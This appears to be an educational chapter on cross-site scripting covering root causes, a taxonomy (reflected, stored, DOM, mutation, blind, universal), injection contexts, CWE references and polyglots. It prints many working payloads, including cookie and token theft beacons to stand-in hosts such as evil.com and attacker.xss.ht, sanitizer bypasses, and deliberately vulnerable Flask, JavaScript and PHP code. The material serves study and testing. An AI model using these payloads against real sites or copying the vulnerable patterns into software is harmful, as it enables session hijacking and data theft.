# 01 - XSS Fundamentals & Taxonomy

## 1. Definition and Root Cause

Cross-Site Scripting (XSS) is a code injection vulnerability that occurs when an application includes untrusted data in a web page without proper validation or escaping. The root cause is the browser's inability to distinguish between legitimate application code and attacker-supplied content once it has been injected into the page's execution context.

At its core, XSS exploits the **trust relationship** between a user's browser and a web application. The browser executes any script that appears to originate from the trusted origin, regardless of whether it was placed there by the legitimate application or injected by an attacker. This is fundamentally a failure to maintain the **integrity boundary** between code and data within the HTML/JavaScript rendering pipeline.

**Source:** [MDN - Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)

## 2. The Browser Trust Model and Same-Origin Policy (SOP)

The **Same-Origin Policy (SOP)** is the cornerstone of browser security. It restricts how scripts loaded from one origin can interact with resources from another origin. An origin is defined by the tuple: `(scheme, host, port)`.

**How XSS Violates SOP:**
XSS does not technically "bypass" SOP -- it operates **within** it. When an attacker injects a script into `https://victim.com`, the script runs with the full privileges of `https://victim.com`. The browser sees the malicious code as originating from the trusted origin, granting it:

- Full read/write access to the DOM of the current page
- Access to cookies scoped to that origin (unless HttpOnly is set)
- Ability to make authenticated XMLHttpRequest/fetch calls to the same origin
- Access to localStorage, sessionStorage, and IndexedDB for that origin
- Ability to read anti-CSRF tokens embedded in the page

```javascript
// Attacker-injected script running in victim.com context
// This is NOT a cross-origin request -- SOP allows it
fetch('/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // Exfiltrate to attacker-controlled server
    navigator.sendBeacon('https://evil.com/steal', JSON.stringify(data));
  });
```

**Source:** [Vercel - Understanding XSS Attacks](https://vercel.com/kb/guide/understanding-xss-attacks)

## 3. XSS vs CSRF vs HTML Injection

| Aspect | XSS | CSRF | HTML Injection |
|--------|-----|------|----------------|
| **Attack vector** | Inject script into trusted page | Forge cross-origin request using victim's session | Inject markup without script execution |
| **Requires JS execution** | Yes | No | No |
| **Violates SOP** | Operates within SOP | Exploits SOP exceptions (form submissions, image loads) | N/A |
| **Defense** | Output encoding, CSP | CSRF tokens, SameSite cookies | Output encoding |
| **CWE** | CWE-79 | CWE-352 | CWE-80 |

Key distinction: XSS achieves **arbitrary code execution** in the browser. CSRF tricks the browser into performing a **state-changing action**. HTML injection modifies **page structure** without executing scripts (e.g., phishing via injected forms). An XSS vulnerability can always be leveraged to perform CSRF attacks, but not vice versa.

## 4. How User Input Reaches the DOM Unsanitized

The injection pipeline follows a predictable pattern:

```
User Input (HTTP params, headers, cookies, form fields, URL fragments)
    |
    v
Server-Side Processing (or lack thereof)
    |
    v
Response Generation (template rendering, string concatenation, API response)
    |
    v
Browser Parsing (HTML parser, JavaScript engine, CSS parser)
    |
    v
DOM Construction (script execution, event handler registration)
    |
    v
XSS Trigger (page load, user interaction, timer)
```

**Common vulnerable patterns:**

```python
# Server-side: Python/Flask -- reflected XSS via string concatenation
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f'<h1>Results for: {query}</h1>'  # VULNERABLE -- no escaping
```

```javascript
// Client-side: DOM-based XSS via innerHTML
const params = new URLSearchParams(window.location.search);
document.getElementById('output').innerHTML = params.get('msg');  // VULNERABLE
```

```php
// Server-side: PHP -- stored XSS via database retrieval
$comment = $db->query("SELECT body FROM comments WHERE id=$id")->fetchColumn();
echo "<div class='comment'>$comment</div>";  // VULNERABLE -- no htmlspecialchars()
```

## 5. The XSS Kill Chain

**Phase 1 -- Injection:** Attacker delivers malicious payload into a context where it will be rendered as code. This can be via URL parameters (reflected), database storage (stored), or client-side URL fragment/hash manipulation (DOM-based).

**Phase 2 -- Execution:** The browser's parser encounters the injected payload and executes it. The execution trigger depends on context: inline `<script>` tags execute during parsing, event handlers execute on user interaction, and `javascript:` URLs execute on navigation.

**Phase 3 -- Exploitation:** The executing script performs the attacker's objective:

| Exploitation Goal | Technique | Example |
|-------------------|-----------|---------|
| Session Hijacking | Cookie theft | `new Image().src='https://evil.com/?c='+document.cookie` |
| Credential Theft | Fake login form injection | Overlay phishing form on legitimate page |
| Keylogging | Event listener injection | `document.addEventListener('keypress', ...)` |
| Cryptomining | Script injection | Load crypto-mining script via injected tag |
| Worm Propagation | Self-replicating stored XSS | Samy worm (MySpace, 2005) |
| Drive-by Download | Redirect to exploit kit | `window.location = 'https://exploit-kit.com/'` |
| Data Exfiltration | API calls with victim's session | Fetch sensitive data and beacon to attacker |

**Source:** [Cobalt - A Pentester's Guide to Cross-Site Scripting](https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss)

## 6. XSS Taxonomy

### 6.1 Reflected XSS (Type 1 -- Non-Persistent)

The payload is embedded in the request (typically a URL parameter) and reflected back in the immediate server response without sanitization. Requires social engineering to deliver the malicious URL to the victim.

```
GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: vulnerable-app.com

HTTP/1.1 200 OK
<html><body>Search results for: <script>alert(document.domain)</script></body></html>
```

**Attack flow:** Attacker crafts URL -> victim clicks -> server reflects payload -> browser executes.

### 6.2 Stored XSS (Type 2 -- Persistent)

The payload is permanently stored on the target server (database, message forum, comment field, visitor log) and served to every user who views the affected page. More dangerous than reflected XSS because it does not require social engineering per victim.

```javascript
// Stored in database via comment form
// POST /api/comments
// Body: {"body": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>"}

// Served to every user viewing the page
// GET /post/123 -> includes the malicious comment in HTML response
```

**Source:** [PortSwigger - Exploiting XSS to Steal Cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

### 6.3 DOM-Based XSS (Type 0 -- Client-Side)

The vulnerability exists entirely in client-side JavaScript. The server never sees the payload (e.g., when it is in the URL fragment `#`). The malicious data flows from a **source** (user-controllable input) to a **sink** (dangerous DOM API).

**Common sources:** `document.URL`, `document.documentURI`, `location.href`, `location.search`, `location.hash`, `window.name`, `document.referrer`, `postMessage` data

**Common sinks:** `document.write()`, `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`, `element.src`, `element.href`, `jQuery.html()`, `$.append()`

```javascript
// DOM-based XSS -- payload never touches the server
// URL: https://vulnerable.com/page#<img src=x onerror=alert(1)>
const hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;  // Sink: innerHTML
```

**Source:** [PortSwigger - DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based), [OWASP - DOM Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

### 6.4 Mutation XSS (mXSS)

Occurs when a sanitizer (e.g., DOMPurify) parses HTML differently than the browser. The sanitizer considers the input safe, but the browser's parser **mutates** the markup during DOM construction, turning benign content into executable code.

**CVE-2024-47875** (DOMPurify): Bypass via nested HTML elements that the sanitizer parsed differently than the browser, enabling mXSS through namespace confusion.

**CVE-2025-26791** (DOMPurify < 3.2.4): Incorrect regex in template literal handling allowed XSS payload to pass through sanitization. Exploited browser parsing quirks for `<svg>`, `<desc>`, `<title>` elements where the browser "fixes" the HTML, transforming sanitized-dead-code into active XSS payloads.

```html
<!-- mXSS example: sanitizer sees safe HTML, browser mutates it -->
<!-- Input that DOMPurify considers safe: -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- After browser mutation during DOM construction,
     the comment is broken out and the img tag executes -->
```

**Source:** [CVE-2024-47875 DOMPurify mXSS](https://www.cve.news/cve-2024-47875/), [CVE-2025-26791 DOMPurify mXSS](https://www.cve.news/cve-2025-26791/)

### 6.5 Self-XSS

The victim is tricked into manually executing malicious code in their own browser (typically via the developer console). While not a traditional vulnerability, it becomes exploitable when chained with other techniques like **login CSRF** or **cookie tossing** to escalate impact.

```
// Attacker instructs victim via social engineering:
"Open DevTools and paste this code to unlock a feature:"
document.location='https://evil.com/steal?token='+localStorage.getItem('auth_token')
```

**Source:** [Cookie Tossing: Self-XSS Exploitation](https://www.thomashouhou.com/post/cookie-tossing-attacks/)

### 6.6 Blind XSS

A stored XSS variant where the payload fires in a context the attacker cannot directly observe -- typically in **admin panels**, **log viewers**, **support ticket systems**, **email parsing engines**, or **error reporting dashboards**. Requires out-of-band data exfiltration to confirm execution.

**Key injection points:**
- User-Agent headers (parsed by analytics dashboards)
- Referer headers (logged by backend systems)
- Form field values viewed in admin interfaces
- Email headers/bodies rendered in webmail clients
- UTM parameters and tracking parameters processed by marketing tools
- File metadata (EXIF data, PDF properties, document titles)

**Tools:** XSS Hunter, BXSS Hunter, Burp Collaborator, Dalfox

```html
<!-- Blind XSS payload using external script for callback -->
"><script src=https://attacker.xss.ht/probe.js></script>

<!-- Alternative using image beacon -->
"><img src=x onerror="fetch('https://attacker.xss.ht/?c='+document.cookie)">
```

```
# Payload in User-Agent header
User-Agent: Mozilla/5.0 <script src=https://attacker.xss.ht></script>
```

**Source:** [Intigriti - Hunting for Blind XSS](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide), [Bugcrowd - Guide to Blind XSS ($250,000)](https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/)

### 6.7 Universal XSS (UXSS)

A **browser-level vulnerability** (not application-level) that allows script execution across any origin. Exploits flaws in browser internals, extensions, or in-app browser implementations to break the Same-Origin Policy entirely.

**CVE-2024-5739:** LINE iOS in-app browser (< v14.9.0) allowed execution of arbitrary JavaScript in the top frame from an embedded iframe on any website, enabling manipulation of displayed content and user session information across all visited sites.

UXSS is categorized as critical severity because a single vulnerability affects every web application the victim visits, not just a single target.

**Source:** [CVE-2024-5739](https://securityvulnerability.io/vulnerability/CVE-2024-5739), [Beyond XSS - Universal XSS](https://aszx87410.github.io/beyond-xss/en/ch2/universal-xss/)

## 7. Injection Contexts

### 7.1 HTML Context
Injection between HTML tags where the parser is in the "data state."

```html
<!-- Vulnerable template -->
<div>Welcome, USER_INPUT</div>

<!-- Exploit -->
<div>Welcome, <script>alert(1)</script></div>
<div>Welcome, <img src=x onerror=alert(1)></div>
```

### 7.2 HTML Attribute Context
Injection within an HTML attribute value. Requires breaking out of the attribute.

```html
<!-- Vulnerable template -->
<input value="USER_INPUT">

<!-- Exploit: break out of attribute -->
<input value=""><script>alert(1)</script>">
<input value="" onfocus=alert(1) autofocus="">

<!-- If inside event handler attribute (double encoding needed) -->
<div onclick="doSomething('USER_INPUT')">
<div onclick="doSomething('');alert(1)//')">
```

### 7.3 JavaScript Context
Injection inside a `<script>` block or inline JavaScript.

```html
<!-- Vulnerable -->
<script>var name = "USER_INPUT";</script>

<!-- Exploit: break out of string -->
<script>var name = "";alert(1)//";</script>
<script>var name = "</script><script>alert(1)</script>";</script>
```

### 7.4 URL Context (href, src, action attributes)
Injection into URL-accepting attributes. The `javascript:` pseudo-protocol is the primary vector.

```html
<!-- Vulnerable -->
<a href="USER_INPUT">Link</a>

<!-- Exploit -->
<a href="javascript:alert(1)">Link</a>
<a href="javascript:alert(String.fromCharCode(88,83,83))">Link</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Link</a>
```

### 7.5 CSS Context
Injection in `<style>` blocks or `style` attributes. Modern browsers have largely mitigated CSS-based script execution, but data exfiltration via CSS is still possible.

```html
<!-- Still works: CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(https://evil.com/leak?char=a)}
input[value^="b"]{background:url(https://evil.com/leak?char=b)}
/* ... enumerate to extract attribute values character by character */
</style>
```

### 7.6 SVG and MathML Context
SVG and MathML have their own namespaces and parsing rules that create XSS opportunities, especially via namespace confusion.

```html
<!-- SVG vectors -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributeName=x>

<!-- Namespace confusion for sanitizer bypass -->
<svg><foreignObject><body onerror=alert(1)><img src=x></foreignObject></svg>
<math><mtext><img src=x onerror=alert(1)></mtext></math>
```

### 7.7 Template Context (Client-Side Templating)
Injection into client-side template engines (AngularJS, Vue.js, Handlebars).

```html
<!-- AngularJS template injection -->
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### 7.8 JSON Context
Injection into JSON responses that are rendered as HTML or parsed unsafely.

```json
{"username": "<img src=x onerror=alert(1)>"}
```

```html
<!-- JSON with callback (JSONP) -- if still supported -->
<script src="https://api.target.com/data?callback=alert"></script>
```

### 7.9 Markdown Context
Markdown parsers that allow raw HTML or have insufficient sanitization.

```markdown
[Click me](javascript:alert(1))
![img](x" onerror="alert(1))
<details open ontoggle=alert(1)>

[XSS](javascript&#58;alert(1))
```

**Source:** [Markdown XSS Payloads](https://github.com/cujanovic/Markdown-XSS-Payloads)

### 7.10 PDF and Email Context
PDF JavaScript execution and HTML email rendering create unique XSS surfaces.

```
// PDF XSS via embedded JavaScript
app.alert('XSS');

// HTML email XSS (depends on email client rendering engine)
// Email clients vary widely in their HTML/JS support
// Outlook, Gmail strip scripts but may allow CSS-based attacks
```

## 8. OWASP Classification and CWE References

| CWE ID | Name | Description |
|--------|------|-------------|
| **CWE-79** | Improper Neutralization of Input During Web Page Generation | Root CWE for all XSS types |
| CWE-80 | Improper Neutralization of Script-Related HTML Tags | Basic script tag injection (subset of CWE-79) |
| CWE-81 | Improper Neutralization of Script in an Error Message | XSS in error pages |
| CWE-83 | Improper Neutralization of Script in Attributes | XSS via event handler attributes |
| CWE-84 | Improper Neutralization of Encoded URI Schemes | `javascript:` URI injection |
| CWE-85 | Doubled Character XSS Manipulations | Encoding bypass via doubled characters |
| CWE-87 | Improper Neutralization of Alternate XSS Syntax | Non-standard XSS vectors |

**OWASP Top 10 Position:**
- 2017: **A7 -- Cross-Site Scripting** (standalone category)
- 2021: Merged into **A03:2021 -- Injection** (second most common category, found in 94% of applications tested)
- 2025: Injection category dropped to **#5** while remaining a pervasive issue

**Source:** [CWE-79 Official](https://cwe.mitre.org/data/definitions/79.html), [OWASP Top 10:2025](https://owasp.org/Top10/2025/en/)

## 9. Real-World Impact Statistics

- **CWE-79 ranked #2** in the 2024 CWE Top 25 Most Dangerous Software Weaknesses, trailing only CWE-787 (out-of-bounds write).
- XSS was detected in **25% of scanned web targets** according to Acunetix analysis, making it the fourth-highest severity vulnerability class.
- In 2025 analysis, XSS remained the **most commonly identified web application vulnerability** by frequency, though Broken Access Control surpassed it at 29.9% of tested applications.
- Nearly **70% of applications** are missing Content Security Policy headers entirely or use ineffective configurations, leaving them exposed to XSS exploitation.
- Bug bounty payouts for XSS range from **$50 (self-XSS) to $250,000+ (blind XSS in critical systems)**.

**Notable historical incidents:**
- **Samy Worm (2005):** Stored XSS in MySpace propagated to 1 million users in 20 hours
- **British Airways (2018):** Magecart skimming via stored XSS, 380,000 payment cards stolen, GBP 20M fine
- **Fortnite (2019):** Reflected XSS in Epic Games authentication, enabling account takeover of 200M+ accounts

**Source:** [Invicti - CWE Top 25 for 2024](https://www.invicti.com/blog/web-security/2024-cwe-top-25-list-xss-sqli-buffer-overflows), [2NS Cybersecurity - Application Security in 2025](https://www.2ns.fi/en/application-security-in-2025-what-the-data-really-tells-us/)

## 10. Polyglot Payloads

Polyglot payloads are designed to execute across multiple injection contexts simultaneously, making them valuable for testing when the exact context is unknown.

```javascript
// Classic compact polyglots -- work across HTML, attribute, and JS contexts
'-alert(1)-'
"onmouseover="alert(1)
</script><script>alert(1)</script>

// SVG-based polyglot
"><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

// Multi-context polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/( /* */oNcliCk=alert() )//
```

**Source:** [PayloadsAllTheThings - XSS Polyglot](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md), [0xsobky - Ultimate XSS Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
